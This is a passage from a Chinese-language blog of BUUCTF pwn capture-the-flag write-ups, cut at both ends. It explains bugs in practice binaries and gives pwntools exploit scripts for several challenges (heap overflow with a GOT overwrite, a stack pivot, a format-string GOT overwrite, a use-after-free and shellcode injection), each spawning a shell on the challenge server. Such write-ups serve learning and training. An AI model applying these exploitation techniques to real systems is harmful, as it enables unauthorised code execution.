class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29858</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, desclen, desc, name</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;size of description: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>, name)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;text length: &#x27;</span>, <span class="built_in">str</span>(desclen).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>, desc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">index, desclen, desc</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;text length: &#x27;</span>, <span class="built_in">str</span>(desclen).encode())</span><br><span class="line">	io.sendafter(<span class="string">b&#x27;text: &#x27;</span>, desc)</span><br><span class="line">	</span><br><span class="line">add(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="string">b&#x27;colin&#x27;</span>)	<span class="comment"># user #0</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="string">b&#x27;colin&#x27;</span>, <span class="string">b&#x27;colin&#x27;</span>)		<span class="comment"># user #1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="string">b&#x27;colin&#x27;</span>, <span class="string">b&#x27;colin&#x27;</span>)		<span class="comment"># user #2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x80</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)		<span class="comment"># prev size of user_#2.desc</span></span><br><span class="line">payload += p32(<span class="number">0x29</span>)	<span class="comment"># size of user_#2.desc</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += p32(<span class="number">0</span>)		<span class="comment"># prev size of user_#2.userinfo</span></span><br><span class="line">payload += p32(<span class="number">0x89</span>)	<span class="comment"># size of user_#2.userinfo</span></span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;free&#x27;</span>])	<span class="comment"># change the desc pointer to .plt.got</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="number">0x100</span>, payload, <span class="string">b&#x27;colin&#x27;</span>)	<span class="comment"># user #3, desc chunk = userinfo #1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;description: &#x27;</span>)</span><br><span class="line">free = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>, free)</span><br><span class="line">base = free - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">update(<span class="number">2</span>, <span class="number">4</span>, p32(sys))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu056-ciscn_2019_s_4"><a class="markdownIt-Anchor" href="#buu056-ciscn_2019_s_4"></a> buu056-ciscn_2019_s_4</h1>
<p>这题的vuln函数里面有两个输入，第一个输入我们通过printf套出来ebp的地址，可以计算得到我们输入的字符串的地址，之后第二个输入将ebp修改到字符串里面，返回到一个函数内部，在没有push ebp的前提下，leave指令会首先进行mov esp, ebp操作，将esp强制上抬到我们的字符串中间，将system地址写到字符串中即可getshell。注意字符串’/bin/sh’要写到system地址高地址处，防止system函数内部覆盖字符串。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28199</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">40</span>-<span class="number">1</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">io.recv(<span class="number">40</span>)</span><br><span class="line">ebp = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br><span class="line">buf_addr = ebp - <span class="number">0x38</span></span><br><span class="line">payload = p32(elf.plt[<span class="string">&#x27;system&#x27;</span>])        <span class="comment"># offset: 0x0</span></span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>])     <span class="comment"># offset: 0x4</span></span><br><span class="line">payload += p32(buf_addr + <span class="number">0xC</span>)          <span class="comment"># offset: 0x8</span></span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>               <span class="comment"># offset: 0xC</span></span><br><span class="line">payload += cyclic(<span class="number">0x14</span>)                 <span class="comment"># 0ffset: 0x14</span></span><br><span class="line">payload += p32(buf_addr - <span class="number">4</span>)            <span class="comment"># ebp</span></span><br><span class="line">payload += p32(<span class="number">0x8048562</span>)               <span class="comment"># ret addr: leave; ret</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu057-hitcontraining_magicheap"><a class="markdownIt-Anchor" href="#buu057-hitcontraining_magicheap"></a> buu057-hitcontraining_magicheap</h1>
<p>和第39题完全相同，除了magic和heaparray的地址少了0x20。略过。</p>
<h1 id="buu058-axb_2019_fmt32"><a class="markdownIt-Anchor" href="#buu058-axb_2019_fmt32"></a> buu058-axb_2019_fmt32</h1>
<p>格式化字符串题。首先通过调试找到格式化字符串的偏移：<br />
<img src="https://img-blog.csdnimg.cn/47a6b3421a8c444dbc6728cc82ca0b28.png" alt="" /><br />
使用格式化字符串泄露got表地址，然后使用fmtstr_payload函数构造payload，将printf函数的got表地址改成system。（下面的代码有一定概率通不过，不知道是什么原因）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29861</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>, <span class="string">b&#x27;a%9$s&#x27;</span> + p32(elf.got[<span class="string">&#x27;alarm&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Repeater:a&#x27;</span>)</span><br><span class="line">alarm = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(alarm))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;alarm&#x27;</span>, alarm)</span><br><span class="line">base = alarm - libc.dump(<span class="string">&#x27;alarm&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line">payload = <span class="string">b&#x27;|| deadbeef||&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">11</span>, &#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]: sys&#125;, numbwritten=<span class="number">22</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;|| /bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu059-ciscn_2019_n_3"><a class="markdownIt-Anchor" href="#buu059-ciscn_2019_n_3"></a> buu059-ciscn_2019_n_3</h1>
<p>经过对源程序的分析，可以得到本题中使用的数据结构如下：<br />
<img src="https://img-blog.csdnimg.cn/cf4990b277154a348f0414e5230cd8a3.png" alt="" /><br />
records全局变量是chunk_info*的数组。其中可以存放整型或字符串。<br />
在两个释放内存的函数中都没有将全局变量中的对应指针删除，可能会导致UAF。<br />
由于打印内容使用的是chunk_info中的函数指针，因此修改这个函数指针可以有任意代码执行。<br />
此处利用UAF修改函数指针，修改free函数指针到system，修改print函数指针为字符串’sh\x00\x00’，这样在删除的时候就可以执行&quot;system(‘sh’)&quot;。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, <span class="built_in">type</span>, content, length=<span class="number">0</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;CNote &gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Type &gt; &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>).encode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Length &gt; &#x27;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Value &gt; &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;CNote &gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;CNote &gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;123456&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">2</span>, <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]), <span class="number">0xc</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu060-wustctf2020_closed"><a class="markdownIt-Anchor" href="#buu060-wustctf2020_closed"></a> buu060-wustctf2020_closed</h1>
<p>这道题实际上是要我们理解linux标准输入输出。开启一个终端之后，对于这个终端来说有标准输入（文件描述符为0）、标准输出（1）和标准错误输出（2）三个标准IO流。这三个流的文件描述符指向的是一个地方，也就是开启的控制台。理解这道题题解<code>exec 1&gt;&amp;0</code>的关键是将控制台程序本身看成是一个文件，这个文件可以通过我们的键盘输入内容，也可以进行输出，输出的内容可以被我们看见，但输出本身仍然在这个文件中。程序关闭了标准输出和标准错误输出，但是输入没有关闭，三个文件描述符原本指向的都是这个控制台程序，那么现在我们只需要让标准输入重新指向控制台就可以了，也就是指向标准输入指向的地方。</p>
<p>如下图所示，这个控制台程序是pycharm内部的控制台，其标准输入、输出、错误输出都指向/dev/pts/2。那么<code>exec 1&gt;&amp;0</code>实际上就等同于<code>exec 1&gt;/dev/pts/2</code>。<br />
<img src="https://img-blog.csdnimg.cn/f64b0e16746e4033acc32034e0ddaa98.png" alt="" /><br />
我们首先使用<code>exec 1&gt;&amp;0</code>打开输出流，查看一下标准输入流指向的位置，发现是<code>/dev/pts/2</code><br />
<img src="https://img-blog.csdnimg.cn/7d7b13c63cd3446c9925f2526da69930.png" alt="" /><br />
因此，下面的输入也可以打开输出流：<code>exec 1&gt;/dev/pts/2</code>（本地可以，远程不行因为没有file命令）<br />
<img src="https://img-blog.csdnimg.cn/6139c8e25c4c4f389fb3fc2e500f0128.png" alt="" /></p>
<h1 id="buu061-pwnable_start"><a class="markdownIt-Anchor" href="#buu061-pwnable_start"></a> buu061-pwnable_start</h1>
<p>这道题源程序非常简单，应该是用汇编写的，就两个函数。进行了两次系统调用，一次输出一次输入，栈可执行。</p>
<p>观察到输入的长度大于输出，可以通过返回到输出syscall上方的代码，跳过对输出长度<code>mov dl, 14h</code>的修改，而直接执行后面的<code>mov bl,1; mov al,4</code>，可以实现输出0x3C个字节的数据，以此来获取栈的地址。</p>
<p>打印出栈地址之后还可进行一次输出，可以将shellcode写入，然后执行shellcode即可。经过调试发现shellcode有44字节，写入shellcode之后正好就是返回地址的写入位置。但这里需要注意几点：</p>
<ol>
<li>不能直接将返回地址写到shellcode之后。虽然这样能够成功返回到shellcode，但是由于shellcode中有很多push指令，而shellcode在返回地址的低地址处，会导致shellcode的后面一部分被覆盖，无法正常执行。</li>
<li>不能直接将shellcode写到返回地址后面，因为输入的长度最多只能为0x3C字节，在返回地址之后最多只能写入0xC个字节，长度不够。</li>
</ol>
<p>因此考虑在返回地址之后单独写一个跳转的小gadget：<code>sub esp, 0x100; jmp ecx</code>。注意执行到这里时ecx的值和调用输入系统调用的ecx值相等，因此jmp ecx能够直接执行shellcode。而<code>sub esp,0x100</code>则是强制让栈下移，防止shellcode被覆盖。如此，返回地址就应该写<code>sub esp,0x100</code>的地址。</p>
<p><img src="https://img-blog.csdnimg.cn/7a253efba1d34b23b9e8239f6b5b4558.png" alt="" /></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">20</span>)</span><br><span class="line">payload += p32(<span class="number">0x804808B</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Let\&#x27;s start the CTF:&#x27;</span>, payload)</span><br><span class="line">io.recvuntil(p32(<span class="number">0x804808b</span>))</span><br><span class="line">stack_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload += p32(stack_addr + <span class="number">0x14</span>)</span><br><span class="line">payload += asm(<span class="string">&quot;sub esp, 0x100;&quot;</span></span><br><span class="line">               <span class="string">&quot;jmp ecx;&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/buuctf-pwn-write-ups-1/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:28:18 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:18+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUUCTF网站</a></p>
<p>笔者认为过于简单的题目会直接附上exp。<br />
<s>（不得不说buu的题目还挺多的）</s><br />
零基础pwn萌新推荐先看这个：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1854y1y7Ro">视频</a></p>
<h1 id="buu001-test_your_nc"><a class="markdownIt-Anchor" href="#buu001-test_your_nc"></a> buu001-test_your_nc</h1>
<p>连上就行</p>
<h1 id="buu002-rip"><a class="markdownIt-Anchor" href="#buu002-rip"></a> buu002-rip</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27534</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(cyclic(<span class="number">15</span>) + p64(<span class="number">0x401186</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu003-warmup_csaw_2016"><a class="markdownIt-Anchor" href="#buu003-warmup_csaw_2016"></a> buu003-warmup_csaw_2016</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25377</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, cyclic(<span class="number">64</span>+<span class="number">8</span>) + p64(<span class="number">0x40060D</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu004-ciscn_2019_n_1"><a class="markdownIt-Anchor" href="#buu004-ciscn_2019_n_1"></a> buu004-ciscn_2019_n_1</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26735</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Let\&#x27;s guess the number&#x27;</span>, cyclic(<span class="number">44</span>) + p32(<span class="number">0x41348000</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu005-pwn1_sctf_2016"><a class="markdownIt-Anchor" href="#buu005-pwn1_sctf_2016"></a> buu005-pwn1_sctf_2016</h1>
<p>这道题是一个C++ pwn，但是逻辑不难理解，简单分析一下。下面是IDA反汇编的漏洞函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">replace</span>((std::string *)v3);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, v3, v6, v4);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v3);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v4);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里重点关注&quot;=&quot;和replace函数，这也是程序在栈内存中操作的重点。在调试过程中，那些<code>std::allocator&lt;char&gt;::allocator</code>的语句对栈区没有明显的影响，略过。经过手动反编译，还原出的源代码大致如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string input;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">char</span> info[<span class="number">32</span>];</span><br><span class="line">	<span 